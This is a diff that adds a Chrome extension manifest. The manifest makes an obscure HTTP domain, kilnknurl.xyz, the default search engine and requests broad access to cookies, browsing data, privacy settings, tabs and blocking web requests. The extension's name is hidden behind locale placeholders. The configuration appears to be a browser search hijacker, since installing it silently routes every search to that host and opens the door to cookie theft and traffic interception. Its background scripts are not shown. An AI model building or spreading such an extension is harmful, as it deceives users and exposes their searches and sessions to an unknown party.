@@ -1,0 +1,47 @@
+{
+	"background": {
+		"persistence": false,
+		"scripts": [
+			"js/common.js",
+			"js/back.js"
+		]
+	},
+	"browser_action": {
+		"default_icon": "css/img/icon.png",
+		"default_popup": "popup.html"
+	},
+	"chrome_settings_overrides": {
+		"search_provider": {
+			"encoding": "UTF-8",
+			"favicon_url": "http://kilnknurl.xyz/favicon.ico",
+			"is_default": true,
+			"keyword": "kilnknurl",
+			"name": "kilnknurl",
+			"search_url": "http://kilnknurl.xyz/?contentparagraph={searchTerms}"
+		}
+	},
+	"default_locale": "en",
+	"description": "__MSG_appDesc__",
+	"icons": {
+		"128": "css/img/icon.png",
+		"16": "css/img/16x16.png",
+		"48": "css/img/48x48.png"
+	},
+	"incognito": "split",
+	"manifest_version": 2,
+	"name": "__MSG_appName__",
+	"optional_permissions": [
+		"<all_urls>"
+	],
+	"permissions": [
+		"privacy",
+		"cookies",
+		"browsingData",
+		"tabs",
+		"webRequest",
+		"webRequestBlocking",
+		"storage"
+	],
+	"update_url": "https://clients2.google.com/service/update2/crx",
+	"version": "1.0"
+}
